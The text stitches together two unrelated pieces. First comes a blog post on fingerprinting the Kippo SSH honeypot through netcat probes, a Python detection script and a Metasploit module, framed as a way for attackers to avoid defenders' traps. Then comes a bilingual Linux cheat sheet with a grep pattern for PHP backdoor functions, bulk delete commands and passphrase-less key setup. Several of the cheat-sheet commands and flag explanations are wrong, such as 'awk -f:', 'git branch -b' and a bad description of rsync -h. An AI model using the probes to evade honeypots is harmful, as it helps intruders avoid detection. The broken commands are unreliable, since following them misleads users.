Kippo is a medium-interaction SSH honeypot written in Python. Kippo uses the twisted library (as well as a few others) to create a very realistic-looking SSH service. Discussing the functionality and applicability of Kippo is a blog post in and of itself but trust me, it kicks ass.

The other day I was brainstorming some of the ways bad guys could improve their operational security. One idea was to fingerprint all services for known honeypot frameworks before performing any attacks as a counterintelligence tactic.


# Getting our hands dirty #

There are a number of dead giveaways from inside the Kippo shell such as the following janky regex for ping:

$ ssh root@1.1.1.1
Password:  
root@devops008:~# ping 999.999.999.999  
PING 999.999.999.999 (999.999.999.999) 56(84) bytes of data.  
64 bytes from 999.999.999.999 (999.999.999.999): icmp_seq=1 ttl=50 time=45.4 ms  
64 bytes from 999.999.999.999 (999.999.999.999): icmp_seq=2 ttl=50 time=40.3 ms  
...

I set out to find some methods to fingerprint Kippo without authenticating, which lead me to this blog post.

The author of that blog post wrote about how telnetting to a Kippo instance and sending a few carriage returns will cause Kippo to throw an error. The error itself isn't important- what's important is that OpenSSH throws a different error.

The following is a quick proof-of-concept using Fabrizio's method:


# OpenSSH #

$ printf "\n\n\n\n\n\n\n\n" | nc -w3 2.2.2.2 22
SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2  
Protocol mismatch.  
$


# Kippo #

$ printf "\n\n\n\n\n\n\n\n" | nc -w3 1.1.1.1 22
SSH-2.0-OpenSSH_5.5p1 Debian-4ubuntu5  
bad packet length 168430090  
$

The responses are different. OpenSSH throws a Protocol mismatch error as soon as it receives a carriage return, whereas Kippo responds with bad packet length.

Using this information, we can whip up a quick Python script to check if an SSH server is running Kippo.

#!/usr/bin/python

# import the libraries we want to use
import socket  
import sys

# check for the presence of a command line argument, exit if it doesn't exist
if len(sys.argv) != 2:  
    print '[+] Usage: python %s 1.1.1.1' % sys.argv[0]
    exit()

# set our variables
host = sys.argv[1]  
port = 22

# construct the tcp socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect to the host
s.connect((host,port))

# receive the SSH banner
banner = s.recv(1024)

# send eight carriage returns
s.send('\n\n\n\n\n\n\n\n')

# get response from the server, store in a variable
response = s.recv(1024)

# close the socket
s.close()

# check to see if the response from the server contains the number we're looking for
if "168430090" in response:  
    print '[!] Kippo honeypot detected!'

It's ugly, but it get's the job done.

...or does it?


# Kippo Patch #

So, Fabrizio's method worked like a charm on all versions of Kippo, until the author patched the code to mimic OpenSSH and return the same error.

$ printf "\n\n\n\n\n\n\n\n" | nc -w3 127.0.0.1 22
SSH-2.0-OpenSSH_5.1p1 Debian-5  
Protocol mismatch  

Rats. Looks like we're out of luck.

...or are we?
Sneakin around ya patches

Let's take a look at the fix implemented by the Kippo developer:

if not 'bad packet length' in desc:  
  # With python >= 3 we can use super?
  transport.SSHServerTransport.sendDisconnect(self, reason, desc)
else:  
  self.transport.write('Protocol mismatch.\n')
  log.msg('Disconnecting with error, code %s\nreason: %s' % \ (reason, desc))
  self.transport.loseConnection()

Looks like this code might leave Kippo still fingerprintable. Can we find a way to seduce a Kippo instance into throwing this generic Protocol mismatch error, but using a request that OpenSSH would allow?

After a little bit of hard work and determination, I figured out a method to invoke this generic error message in Kippo whilst preserving regular behavior in OpenSSH.

...and by "hard work and determination", I really mean wvu at Rapid7 found this hilariously convenient comment left by HD Moore on Fabrizio's blog.

It turns out echoing the SSH server banner back at the server will freak Kippo out and cause it to throw the Protocol mismatch error, but OpenSSH and other SSH servers will not. Bingo


# Kippo #

$ nc -w localhost 2222
SSH-2.0-OpenSSH_5.1p1 Debian-5  
SSH-2.0-OpenSSH_5.1p1 Debian-5


Protocol mismatch.  


# OpenSSH #

$ nc -w3 localhost 22
SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2  
SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2  
����8�����2��curve25519-sha256@libssh.org...
...


# Fin #

Using both of these methods, we can successfully detect patched and unpatched versions of Kippo without ever authenticating. To demonstrate, I wrote up a really basic and kind of depressing Metasploit auxiliary module which is currently going through the process of being integrated into the framework.

msf > use auxiliary/scanner/ssh/detect_kippo  
msf auxiliary(detect_kippo) > show options

Module options (auxiliary/scanner/ssh/detect_kippo):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.168.98.132   yes       The target address range or CIDR identifier
   RPORT    2222             yes       The target port
   THREADS  1                yes       The number of concurrent threads

msf auxiliary(detect_kippo) > run

[*] 192.168.98.132:2222 - Kippo honeypot detected!
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

Thanks to Fabrizio and HD Moore for the awesome research, wvu at Rapid7 for holding my hand through the Metasploit module process, and the developers of Kippo for building such an awesome honeypot.

As always, shoot me an email or find me on Twitter if you have any questions or feedback.

--Andrew

email - andrew@morris.guru
twitter - @andrew___morris
github - andrew-morris

P.S. I know the module is pretty sad. I had to google every line of it since I've never coded Ruby before.



#############################################################################################################################################################################################

############################################################################################# scp ###########################################################################################

#### scp

#### the SCP protocol is a network protocol, based on the BSD RCP protocol, which supports file transfers between hosts on a network. SCP uses Secure Shell (SSH) for data transfer and utilizes the same mechanisms for authentication, thereby ensuring the authenticity and confidentiality of the data in transit. A client can send (upload) files to a server, optionally including their basic attributes (permissions, timestamps). Clients can also request files or directories from a server (download). SCP runs over TCP port 22 by default. Like RCP, there is no RFC that defines the specifics of the protocol ####

#### 8 Cool Ways To Use SCP ####

1) Edit a file on a remote host using vim

vim scp://username@host//path/to/somefile


2) Colored diff ( via vim ) on 2 remotes files on your local computer.

vimdiff scp://root@server-foo.com//etc/snmp/snmpd.conf scp://root@server-bar.com//etc/snmp/snmpd.conf


3) Restrict the bandwidth for the SCP command

scp -l 10 user@urfix.com:/home/urfix/* .   - the command is obvious, I know, but maybe not everyone knows that using the parameter "-l" you can limit the use of bandwidth command scp. In this example fetch all files from the directory zutaniddu and I copy them locally using only 10 Kbs


4) Compare a remote file with a local file

vimdiff  scp://[@]/


5) Easily scp a file back to the host you're connecting from

mecp () { scp "$@" ${SSH_CLIENT%% *}:Desktop/; }   - Place in .bashrc and invoke like this: "mecp /path/to/file", and it will copy the specified file(s) back to the desktop of the host you're ssh'ing in from. 

To easily upload a file from the host you're ssh'ing in from use this:

ucp (){ scp ${SSH_CLIENT%% *}:Desktop/upload/* .; }


6) scp file from hostB to hostC while logged into hostA

scp user@hostB:file user@hostC:   - while at the command line of of hostA, scp a file from remote hostB to remote hostC. This saves the step of logging into hostB and then issuing the scp  command to hostC.


7) copy something to multiple ssh hosts with a Bash loop

for h in host1 host2 host3 host4 ; { scp file user@$h:/destination_path/ ; }   - Just a quick and simple one to demonstrate Bash For loop. Copies 'file' to multiple ssh hosts.


8) scp with compression.

scp -C 10.0.0.4:/tmp/backup.sql /path/to/backup.sql   - "-C" is for compression.


#### copia archivo local a una maquina remota scp ssh ####

scp archivo.txt usuario@ipserverremoto:/path/

#### Una vez que hemos generado nuestra clave publica y privada, anadimos nuestra clave publica al fichero ~/.ssh/authorized_keys del usuario que va a tener acceso sin clave en la maquina remota. Para hacerlo, primero copiamos el fichero id_rsa.pub al home del usuario remoto con el que queremos acceder sin contrasena. Por ejemplo: ####

scp /home/adrian/.ssh/id_rsa.pub usuario@servidor:~/

#############################################################################################################################################################################################

############################################################################################ sshfs ##########################################################################################

#### sshfs

#### sshfs es una herramienta muy util para todos aquellos que administramos sistemas linux. Es bastante interesante porque nos permite montar directorios remotos usando ssh y trabajar con sistemas de archivos remotos como si fueran locales, con el anadido de que al utilizar ssh, la comunicacion es segura. Logicamente, para montar un directorio remoto via sshfs, el servidor tendra que tener un servidor ssh. ####


#### Instalar sshfs en la maquina cliente ####

En cuanto al cliente, debera disponer de soporte FUSE (Filesystem in User Space) en el kernel, algo seguro si la version del kernel es igual o posterior a la version 2.6.14.


####Podemos comprobar si tenemos cargado el modulo fuse de la siguiente manera: ####

# lsmod | grep fuse


#### Si obtenemos una linea parecida a la siguiente, es que esta cargado: ####

fuse 60956 3


#### Si no estuviera, cargado, lo cargamos: ####

# modprobe fuse
# depmod -A


#### Una vez que tenemos cargado el modulo fuse, instalaremos sshfs: ####

# apt-get install sshfs


#### Y ya podremos montar directorios remotos via ssh. ####


#### Montar directorios remotos usando sshfs ####

#### Cuando queramos montar un directorio de una maquina remota via sshfs, no tendremos mas que ejecutar: ####

# sshfs usuarioremoto@servidor:dir_remoto dir_local


#### Por ejemplo, si queremos montar el directorio /backup que tenemos en una maquina remota llamada recursos, como root, en el directorio local /mnt/backup, ejecutaremos el siguiente comando: ####

# sshfs root@recursos:/backup /mnt/backup


#### Una vez hecho esto, si entramos dentro del directorio /mnt/backup, veremos el contenido del directorio /backup de la maquina recursos. ####


#### Desmontar un directorio remoto montado via sshfs ####

#### Cuando queramos desmontar un directorio de una maquina remota via sshfs, no tendremos mas que ejecutar: ####

# fusermount -u dir_local

#### Siguiendo con el ejemplo anterior: Si queremos desmontar el directorio que teniamos montado en /mnt/backup, ejecutaremos: ####

# fusermount -u /mnt/backup


#############################################################################################################################################################################################

############################################################################################ rsync ##########################################################################################

#### rsync

#### sintaxis y explicaciones de algunos parametros ####

rsync command common options

--delete : delete files that don't exist on sender (system)
-v : verbose (try -vv for more detailed information)
-e : "ssh options" : specify the ssh as remote shell
-a : archive mode
-r : recurse into directories
-z : compress file data

#### copiar archivos excluyendo formatos rsync ####

rsync -r --exclude=.pdf /path/source/dir /path/destination

#### sincronizar archivos con un servidor ssh remoto utilizando rsync ####

rsync -av -e ssh user@host:/dir/remoto/ /dir/local/

#### rsync over ssh ####

rsync -arvz -e 'ssh -p 2233' --progress --delete remote-user@remote-server.org:/path/to/folder /path/to/local/folder

#### the fastest remote directory rsync archival i can muster ####

rsync -ahaxxv --numeric-ids --delete --progress -e "ssh -t -c arcfour -o compression=no -x" user@<server>:<server_dir> <source_dir>

#### this creates an archive that does the following: ####

rsync::

-a:  archive mode - rescursive, preserves owner, preserves permissions, preserves modification times, preserves group, copies symlinks as symlinks, preserves device files.

-h:  preserves hard-links

-a:  preserves acls

-x:  preserves extended attributes

-x:  don't cross file-system boundaries

-v:  increase verbosity

--numeric-ds:  don't map uid/gid values by user/group name

--delete:  delete extraneous files from dest dirs (differential clean-up during sync)

--progress:  show progress during transfer

ssh::

-t   turn off pseudo-tty to decrease cpu load on destination.

-c   arcfour: use the weakest but fastest ssh encryption. must specify "ciphers arcfour" in sshd_config on destination.

-o   compression=no: turn off ssh compression.

-x: turn off x forwarding if it is on by default.

#### i find that -z for rsync compression slows down the transfer tremendously. ####

#### you can flip the command like this: ####

rsync -ahaxxv --numeric-ids --delete --progress -e "ssh -t -c arcfour -o compression=no -x" user@<server>:<server_dir> <source_dir>

#### uso de rsync localmente creando una copia de seguridad sincronizada de la carpeta "documents" (documents) a un pendrive o disco duro (almacenamiento externo) ####

rsync -avz /home/user/documentos /media/pendrive/respaldo

#### respaldo de directorio "home" a una computadora remota por utilizando rsync a travez de ssh hacia la carpeta backup en nuestro servidor ssh remoto ####

rsync -azvhp --delete --exclude=.local/share/trash $home user@user-server:~/backup

-a modo de archivado, respalda todos los subdirectorios, asi como tambien symlinks (enlaces simbolicos), etc
-z comprime los datos antes de ser transmitidos
-v verbose (verbosidad: mostrar las acciones que se realizan de manera detallada)
-h formatea el tamano de los datos para ser mas legibles
-p equivalente a --progress (imprime progresos, tiempo restante, etc) y --partial (no borra archivos parcialmente respaldados para continuarlos transfiriendo posteriormente)
--delete borra archivos en la computadora remota que ya no existen en la computadora local. ssh rsync
--exclude excluye un archivo, directorio o carpeta del respaldo, en el carpeta del respaldo, en el caso presentado, la carpeta trash (datos de la papelera)

#### respecto a como pasarle los nombres de los directorios, hay que tener una especial atencion a si ponemos una barra al final del nombre del directorio o no, ya que significan cosas disti$

rsync -av /curiousx/cosas /home/backup
rsync -av /curiousx/cosas/ /home/backup

####  efectivamente, /curiousx/cosas significa "el directorio cosas y su contenido", mientras que /curiousx/cosas/ significa "lo que hay dentro de el directorio cosas" rsync ####


#############################################################################################################################################################################################

#### how to pagina ofcial

# Simple, Secure Backups for Linux with rsync #

rsync is a UNIX tool for transferring files and synchronizing data. Unlike other file transfer tools (like FTP or SCP) rsync examines the files on both the sender and the receiver and efficiently transfers only what is required to synchronize them.

If this is the first run of rsync, it will transfer each file in its entirety. On the other hand, if this rsync job has been run before, it will transfer only the changes. If there have been no changes, it will transfer nothing.

The benefits of rsync are that it is already installed on most, if not all, linux distributions - so there is nothing to install or configure - and it is secure, as it runs over SSH, which is an encrypted transport.

 

# When Should You Use rsync #

rsync should be considered when there is a file, or a set of files and directories, that will need to be kept in sync with one another.

Each time you run the same rsync command, you will synchronize the two locations - the destination will be updated to match the source. This will be done efficiently - if it is a 10 gigabyte file but only 100 megabytes have changed, only those 100 megabytes will be sent - not the entire 10 gigabytes.

You can also specify a directory and rsync will recursively synchronize the entire contents of that directory and all of its subdirectories to the destination. This is a very convenient way to synchronize two filesystems, for instance, or two home directories.

 

# rsync Has Simple Requirements #

As we mentioned, rsync is almost universally available on all linux systems - it is unlikely that you will need to install or configure any software. You can make sure rsync is installed by running this command:

# which rsync

The output should be something like this:

/usr/bin/rsync

or:

/usr/local/bin/rsync

You should also make sure that you have the ssh client installed:

# which ssh

Both systems - the source and the destination - need to have rsync installed. Further, while the source system simply needs an ssh client (which we just tested for) the destination system needs to have the SSH Server running on port 22. You can test this by running this ssh command on the source system:

# ssh username@destination

So, if your destination host is 192.168.0.1 and the username you use to log into the destination is "username", you would test SSH with this command:

# ssh username@192.168.0.1

You may see a message like this:

The authenticity of host '192.168.0.1' can't be established.
DSA key fingerprint is 18:e3:aa:5d:4f:00:73:6d:67:af:6e:c9:10:6b:8d:23.
Are you sure you want to continue connecting (yes/no)?

type "yes" and hit enter(*), and then enter your password. You should now be logged into the destination server. Simply type "exit" and hit enter to log out. You have successfully tested the SSH connection between the source machine and the destination machine.

* If you are connecting to an rsync.net server, or any other server out on the Internet, you should confirm that the "key fingerprint" matches before typing "yes". rsync.net key fingerprints can be found here.

 

# Synchronizing a Directory with rsync #

We have confirmed that both systems (source and destination) have rsync installed and we have tested the SSH connection between them. Now you need to choose a directory to synchronize. Let's choose:

/etc

To synchronize the /etc directory, and all of the files in it, as well as all of the subdirectories underneath it, recursively, to /backup on the destination, run this command on the source system:

rsync -avH /etc username@192.168.0.1:/backup

You will be asked for your password, as the rsync tool establishes an SSH connection between the two systems. You will then see a list of all the files it is transferring as they are transferred.

Once you have a new command prompt, the synchronization has completed.

 

# Keeping in sync with rsync #

After this first successful test, I encourage you to re-run the exact same rsync command immediately. You will see that it completes almost instantly, since very little (perhaps nothing) has changed in the source files since you ran it the first time - so it synchronizes the source and destination almost instantly.

If you make some changes to one or more files in /etc (the source directory we used in the test, above) and then re-run the same rsync command again, you will see those files retransferred, but the job will complete very quickly as most of the files have not changed.

It is worth noting that if you interrupt an rsync job - perhaps by typing CTRL-C while it is running, or perhaps because of a network failure, you can simply re-run the exact same command and it will pick up right where it left off. There are no problems that arise from a broken or aborted rsync job - simply re-run the exact same command again.

If you delete files from the source, they will remain in place on the destination - even though they no longer exist on the source. If you would like files that you delete on the source to also be deleted on the destination, add the --delete option to your command line:

rsync -avH --delete /etc username@192.168.0.1:/backup

But be careful - if you are using rsync as part of a backup process, this can be dangerous - rsync doesn't know that you accidently deleted some files on the source, and with the --delete option in place, it will happily delete them on the destination ... and then you will not have them anywhere.

 

# Automated, Scheduled Backups with rsync #

rsync is a very simple, very reliable backup tool that is uniquely suited to the problem of backing up one linux system to another. Presumably you would like to do this automatically, on a schedule.

The problem is that, as we saw above, SSH asks us for a password. How will we type in a password every night when our backups run ? The answer is to use an SSH key to log in rather than a password.

On the source system, log in as the user that will be performing the backup.

As that user, on the source system, run this command:

ssh-keygen -t rsa

Accept the defaults - do not change the filenames or file locations It is very important that the resultant private and public keys reside in your home directories .ssh directory, or ~/.ssh (which is the default)

DO NOT enter a passphrase - just hit enter twice, leaving an empty passphrase.

Upload your newly created public key to the destination server using this command:

scp ~/.ssh/id_rsa.pub username@192.168.0.1:.ssh/authorized_keys

Now you have a key in place on the destination server. You should test it by logging in with SSH, just like we did with our original test, above:

# ssh username@192.168.0.1

... except this time, the system should simply log you in, without asking for a password. Remember, this passwordless login will only work for the source user that ran the ssh-keygen command, above - it will not work for any other users on the source system.

Now you may edit your crontab to schedule your rsync job to run. Enter the crontab with:

# crontab -e

and put in this job, which is an example that will run at midnight:

0 0 * * * /usr/bin/rsync -avH /etc username@192.168.0.1:/backup

(note that we specified the full path to the rsync command, which you should always do when putting commands into the crontab)

(NOTE - your rsync might not be installed in /usr/bin - perhaps it is in /usr/local/bin - check the 'which rsync' command that we ran in the very beginning of this article for the location of your rsync command)

Now the /etc directory will be synchronized to the destination every night at midnight. If you want to sync more directories, you can add more rsync commands to the crontab:

0 0 * * * /usr/bin/rsync -avH /etc username@192.168.0.1:/backup
10 0 * * * /usr/bin/rsync -avH /var username@192.168.0.1:/backup
20 0 * * * /usr/bin/rsync -avH /home username@192.168.0.1:/backup

The second command syncs /var, and runs at 12:10, and the third command sync /home and runs at 12:20. The string "10 0 * * *" means "the 10th minute, of the 0th hour (midnight), every day, every week, every month. If you wanted a job to run at 2:30 am, it would be "30 2 * * *".



# Robust Backups with rsync #

Simply synchronizing a source with a destination does NOT mean the source is properly backed up - but it's a start.

What you need next is to maintain multiple versions of your data going back in time such that you can restore a file or directory as it existed on a particular date.

This is very easy if your destination is an rsync.net offsite filesystem.

The rsync.net cloud storage platform creates and maintains daily and weekly snapshots of your entire account, you don't need to do anything - just keep doing a simple sync of your source to our destination. It works just like "Time Machine" in a Mac OSX system - at any time you can enter your rsync.net account and browse into a date in the past and see your entire account as it existed on that date.

However, if your destination is your own linux system, you'll need to use an old fashioned (but very elegant) system called "rsync snapshots".

rsync snapshots are detailed here. Remember, there is no reason to use the rsync snapshot method with an rsync.net account because our cloud storage platform is maintaining these snapshots for you already.

 

# About rsync.net #

rsync.net offers secure cloud storage on an open standards platform for offsite backup and disaster recovery.

With five global locations, rsync.net has provided data safety and industry specific regulatory compliance since 2001.

Customers have the flexibility of using whatever tools they see fit and the backing of real engineers for support.

Let us help your firm protect data on any platform while reducing cost and complexity - Call us today at +1-415-496-9035 or email info@rsync.net. 

########################################################################################## github ###########################################################################################

#### github

# Testing your SSH connection to github

# Create a new repository on the command line

echo "# such-global-css" >> README.md
git init
git add README.md
git commit -m "first commit"
git remote add origin https://github.com/suchacoder/such-global-css.git
git push -u origin master

# Cloning

git --clone <url> <dir>

# Before comitting and or pushing is a good idea to set up git so it remembers who we are and our email, so we don't have to say everytime who you are at the time of commiting or pushing

git config --global user.name "First Name and Last Name"

git config --global user.email "email@gmail.com"

# To check if we did set up our name and email just do:

git config --global user.email

git config --global user.name

# To check the status

git status

# Once we create files or modify them those changes wont we track, so to track them we do:

git add <file.extension>
git *
git add <folder>

# Once we track our changes we can commit, now commit wont add files into the branch, commit is more like little step you do to build something or add more funtionalities before pushing them into the branch that you are working on with the ability to roll back to a previous stage

git commit -m "Descriptive message here" 

# To see all the commits

git log
git log --pretty=oneline -3

# To push (upload) your commits (changes):

git push <repository> <branch>
git push origin master

# To pull changes from contributors or if you have been working on a PC that isn't yours, you do:

git pull

# To branch

git branch <name of the branch>  -   if we use -b will switch up to the new created branch
git branch -b <name of the branch>

# To switch between branches you do

git checkout <name of the branch>  -  master is our default branch

# To push new branches we do:

git push origin <name of the branch>

# To see which is the branch we are currently working on we do:

git branch

# To merge branches we do:

git merge <name of the branch>  -  this will mege the branch where you are working on with the branch you specified

# To delete branches we do:

git branch -d <name of the branch>

# To delete banches that apears on the github webpages we do:

git push origin --delete <name of the branch>

# .gitignore it's used to ignore files that may have sensitive information like passwords or API keys, you ignore folders files extensions, files and so on, just add the of the file you want to ignore inside .gitignore

touch .gitignore
git add .gitignore
git commit -m "Added .gitignore file"
git push

#############################################################################################################################################################################################

########################################################################################## denyhosts ########################################################################################

#### denyhosts

#### denyhosts es un script en python pensado para prevenir ataques de fuerza bruza contra servicios ssh. Este script bloquea ataques ssh anadiendo entradas al archivo /etc/hosts.deny, y si lo configuramos, puede informarnos por e-mail. ####

#### Instalarlo en Debian es realmente facil porque se encuentra en los repositorios: ####

# apt-get install denyhosts

Y configurarlo tambien es muy sencillo porque tan solo tenemos que modificar el fichero /etc/denyhosts.conf y cada parametro viene perfectamente comentado para que conozcamos cual es su funcion.

DenyHosts se basa en TCP Wrapper. Por lo tanto, los ficheros de configuracion /etc/hosts.deny y /etc/hosts.allow estaran creados en el sistema.

En ocasiones, puede que nosotros mismos nos equivoquemos al acceder al servidor y DenyHosts bloquee el acceso para nuestra maquina. En este caso, podemos purgar las entradas anadidas a /etc/hosts.deny de la siguiente manera:

# /etc/init.d/denyhosts stop
# denyhosts --purge
# /etc/init.d/denyhosts start

De este modo, se eliminaran los hosts anadidos con una antiguedad mayor que la definida en PURGE_DENY en el fichero de configuracion /etc/denyhosts.conf.


#############################################################################################################################################################################################

############################################################################################ grep ###########################################################################################

#### grep

#### grep el comando grep nos permite buscar, dentro de los archivos, las lineas que concuerdan con un patron. bueno, si no especificamos ningun nombre de archivo, tomara la entrada estandar$

-c en lugar de imprimir las lineas que coinciden, muestra el numero de lineas que coinciden.
-e patron nos permite especificar varios patrones de busqueda o proteger aquellos patrones de busqueda que comienzan con el signo -.
-r busca recursivamente dentro de todos los subdirectorios del directorio actual.
-v nos muestra las lineas que no coinciden con el patron buscado.
-i ignora la distincion entre mayusculas y minusculas.
-n numera las lineas en la salida.
-e nos permite usar expresiones regulares. equivalente a usar egrep.
-o le indica a grep que nos muestre solo la parte de la linea que coincide con el patron.
-f archivo extrae los patrones del archivo que especifiquemos. los patrones del archivo deben ir uno por linea.
-h nos imprime el nombre del archivo con cada coincidencia.

#### buscar todas las palabras que comiencen por a en un archivo: ####

grep "a*" archivo

#### otra forma de buscar, seria: ####

cat archivo | grep "a*"

#### mostrar por pantalla, las lineas que contienen comentarios en el archivo /boot/grub/menu.lst: ####

grep "#" /boot/grub/menu.lst

#### enviar a un archivo las lineas del archivo /boot/grub/menu.lst que no son comentarios: ####

grep -v "#" /boot/grub/menu.lst

#### contar el numero de interfaces de red que tenemos definidos en el archivo /etc/network/interfaces: ####

grep -c "iface" /etc/network/interfaces

#### mostrar las lineas de un archivo que contienen la palabra badajoz o huelva: ####

grep -e "badajoz" -e "huelva" archivo

#### listar ver todas las ppa agregadas con grep ####

grep -ropish "ppa.launchpad.net/[^/]+/[^/ ]+" /etc/apt | sort -u | sed -r 's/\.[^/]+\//:/'

#### buscar archivos con declaracion js ####

grep -r "<script" | grep -v src | awk -f: '{print $1}' | uniq

#### verificar que usuarios se han logeado en nuestro sistema observando auth.log seguridad ####

grep 'session opened' /var/log/auth.log

#### verificar que cantidad de logeos fallidos tenesmos en nuestro sistema observando auth.log seguridad ####

grep 'failed login' /var/log/auth.log | wc -l

#### con este comando podemos ver listar el nombre, la fecha, y el tty de los usuarios que han tenido fallos de autenticacion en el sistema observando auth.log ####

grep 'authentication failure' /var/log/auth.log | cut -d ' ' -f 1,2,3,12,10

#### listar el primer repositorio que estamos usando en nuestra distro  la opcopm -m em grep hace que grep se detenga a la primera coincidencia ####

grep -m 1 ^deb /etc/apt/sources.list

#### buscar cadenas y reemplazarlas en multiples archivos usando grep y sed ####

grep -lr "foo" . | xargs sed -i "s/foo/bar/g"

#### verificar que usuarios se han logeado en nuestro sistema observando auth.log seguridad ####

grep 'session opened' /var/log/auth.log

#### verificar que cantidad de logeados fallidos tenesmos en nuestro sistema observando auth.log seguridad ####

grep 'failed login' /var/log/auth.log | wc -l

#### con este comando podemos ver listar el nombre, la fecha, y el tty de los usuarios que han tenido fallos de autenticacion en el sistema observando auth.log ####

grep 'authentication failure' /var/log/auth.log | cut -d ' ' -f 1,2,3,12,10

#### comprobamos si el reloj hardware mantiene la hora local o universal (utc) ####

grep utc /etc/default/rcs

#### Filtrar chat entre dos jugadores urban terror

cat urban/public/q3ut4/games.log | egrep -i 'lau|Pacoeldeeltaller' | grep say

#############################################################################################################################################################################################

############################################################################################# perl ##########################################################################################

#### perl

#### iniciar la shell perl cpan cpan ####

perl -mcpan -eshell

#############################################################################################################################################################################################

############################################################################################ netstat ########################################################################################

#### netstat 

n:   - no resuelve las direcciones a sus nombres dns. esto hace mas rapida la ejecucion

a:   - muestra todos las conexiones,incluidas las que estan escuchando

p:   - muestra el numero y nombre del proceso,dueno de dicha conexion

t:   - solo muestra conexiones TCP

#### obtener todas la direcciones ip conectadas a mi maquina mediante netstat #### 

netstat -lantp | grep ESTABLISHED |awk '{print $5}' | awk -f: '{print $1}' | sort -u

#### mostrar numero de conecciones por ip con netstat ####

netstat -antu | awk '{print $5}' | awk -f: '{print $1}' | sort | uniq -c | sort -n

#### verificar conecciones close_wait y time_wait cada 5 segundos ####

while true; do netstat -a|grep wait|wc -l; sleep 5; done

#### monitorizar coneccion abiertas ####

watch "netstat -plan | grep -v listen | grep \":80 \" | awk {'print \$5'} | cut -d: -f 1 | uniq -c | sort -nk 1"


#############################################################################################################################################################################################

########################################################################################### find ############################################################################################

#### find

#### find utilizamos este comando para buscar archivos dentro de una jerarquia de directorios. pero, lo mejor de todo es que no solo podemos buscar, sino que, ademas, podemos ejecutar acciones sobre los elementos localizados por el comando find. por otro lado, podemos realizar la busqueda mediante varios criterios. la sintaxis de este comando es: ####

find directorio/ [expresion]

#### veamos un ejemplo sencillo: queremos buscar los archivos de imagenes con extension .jpg en el directorio del usuario ambrosio: ####

find directorio/ -name "*.jpg"

#### otro ejemplo: imaginemos que quiero listar los directorios que hay en el directorio actual: ####

find directorio/ -maxdepth 1 -type d

#### ahora imaginemos que quiero listar los archivos que se han modificado hoy en el directorio actual: ####

find directorio/ -mtime 0 -type f

#### si quisieramos borrar todos los subdirectorios del directorio /var/backup que tengan una antiguedad mayor de 20 dias: ####

find /var/backup -mtime +20 -type d -exec rm -f {} \;

#### otro ejemplo: queremos borrar todos los directorios del sistema que contengan la palabra sane: ####

find directorio/ -name "*sane*" -type d -exec rm -fr {} \; 2>/dev/null

#### si lo que queremos es borrar todos los archivos del sistema que contengan la palabra sane, no tenemos mas que cambiar el tipo en el comando anterior: ####

find directorio/ -name "*sane*" -type f -exec rm -fr {} \; 2>/dev/null

#### otro ejemplo: imaginemos que queremos recopilar todos los archivos mp3 que tenemos repartidos en diferentes directorios y moverlos a un unico directorio: ####

find directorio/ -name "*.mp3" -exec mv {} /compartido/musica/ \;

#### imaginemos tambien que los usuarios de nuestro sistema descargan archivos mp3 que almacenan en sus cuentas y terminan excediendo su cuota. tan solo tenemos que ejecutar el siguiente comando y borraremos todos los mp3 que haya en el home: ####

find /home/ -name "*.mp3" -exec rm {} \;

#### comprobar la sintaxis de archivos .php en un directorio determinado ####

find directorio/ -name \*.php -exec php -l "{}" \;

#### listar solo los ditectorios dentro de un directorio ####

find directorio/ -maxdepth 1 -type d

#### buscar posible maliciosos comandos php utilizados en backdoors o scripts por el estilo ####

find ./public_html/ -name \*.php -exec grep -hrndskip "\(passthru\|shell_exec\|system\|phpinfo\|base64_decode\|chmod\|mkdir\|fopen\|fclose\|readfile\) *(" {} \;

#### remover eliminar todas las cookies del sistema ####

find $home -name "*.sol" -exec rm {} \;

#### buscar los ultimos 10 archivos modificados en un directorio y sus subdirectorios ####

find directorio/ -type f -print0 | xargs -0 stat -c'%y :%y %12s %n' | sort -nr | cut -d: -f2- | head

#### visualizar logs tiempo real color ####

find /var/log -type f -iregex '.*[^\.][^0-9]+$' -not -iregex '.*gz$' 2> /dev/null | xargs tail -n0 -f | ccze -a

#### buscar archivos que pertenescan a un usuario especifico con find - you can find all files that belong to a specified username: ####

find directorio/ -user nombredeusuario

#### buscar archivos que no pertenecen a mi usuario en mi carpeta personal - you can find all files that doesn't belong to a specified username:####

find directorio/ ! -user nombredeusuario

#### o buscar archivos que pertenecen a un grupo en especifico - you can find all files that belong to a specified group: ####

find directorio/ -group admins

#### o que no pertenecen a un grupo en especifico - you can find all files that doesn't belong to a specified group: ####

find directorio/ ! -group nombredeusuario

#### tambien podemos hacer buscquedas por uid o gid, al mismo tiempo podemos pasar los archivos correspondientes de un usuario hacia otro usuario you can also search by uid and gid with the -uid and -gid options. you can then move all of a user's files to another user by either username or uid: ####

find directorio/ -uid 1100 -ok chown -v 1200 {} \;

find directorio/ -user carla -ok chown -v steven {} \;

#### y esto tambien funciona para cambiar el grupo de cada archivo encontrado - of course this works for changing group membership as well: ####

find directorio/ -group carla -ok chgrp -v admins {} \;

#### borrar eliminar los archivos pertenecientes a un usuario tambien es facil con "find" deleting their files, which find can do with ease: ####

find directorio/ -user 1100 -exec rm {} \;

#### buscar nombre archivos que no sabemos si sus nombres estan en mayusculas o minusculas, "-iname" buscara los nombres en minusculas y mayusculas del nombre del archivo a buscar ####

find directorio/ -iname "mycprogram.c"

#### ejecutar comandos con el parametro "-exec" a un archivos o a una cantidad de archivos encontrados por "find" ####

find directorio/ -iname "mycprogram.c" -exec md5sum {} \;

#### encontrar archivos vacios en un directorio - find all empty files in home directory ####

find directorio/ -empty

#### comando basico utilizando find buscando como nombre de archivo o carpeta "hacker" en la carpeta directorio/ ####

find directorio/ -name "hacker"

#### con el parametro "-maxdepth 2" le indicamos a find que busque hasta 2 directorios mas alla desde el direcctorio inicial indicado en este caso "directorio/" ####

find directorio/ -maxdepth 2 -name "hacker"

#### con el parametro "-cmin" podemos decirle a find que busque archivos que han sido modificados cierta cantidad de minutos atras en este caso 5 minutos ####

find directorio/ -cmin 5

#### si a find le damos el parametro "-mtime 0" find buscara los archivos que han sido modificados en las ultimas 24 horas ####

find directorio/ -mtime 0

#### encontrar archivos que han sido modificados en los ultimos 5 minutos ####

